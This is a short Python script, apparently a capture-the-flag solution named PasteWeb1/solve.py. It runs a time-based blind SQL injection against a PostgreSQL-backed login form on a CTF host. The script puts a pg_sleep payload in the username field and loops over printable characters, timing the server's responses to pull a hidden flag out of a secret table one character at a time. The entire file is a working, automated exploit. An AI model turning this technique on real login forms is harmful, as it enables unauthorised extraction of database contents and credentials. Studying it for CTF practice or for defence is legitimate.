# PasteWeb1/solve.py
import requests
from time import time, sleep

printable_char = ''
for i in range(32, 127):
    printable_char += chr(i)

offset = 0
while True:
    cnt = 0
    flag = ''
    while True:
        cnt += 1
        stop = True
        for c in printable_char:
            sleep(0.1)
            username = "' or 1=(select 1 from pg_sleep(2) where substr((select \
            fl4g from s3cr3t_t4b1e limit 1 offset " + str(offset) + "),1," \
            + str(cnt) + ")='" + flag + c + "') --"
            current_time = str(int(time()))
            url = 'https://pasteweb.ctf.zoolab.org/'
            data = {
                'username': username,
                'password': '',
                'current_time': current_time
            }
            start_time = time()
            requests.post(url, data=data)
            end_time = time()
            if end_time - start_time > 2:
                flag += c
                stop = False
                break
        if stop == True:
            break
        print(flag, cnt)
    if len(flag) == 0:
        break
    offset += 1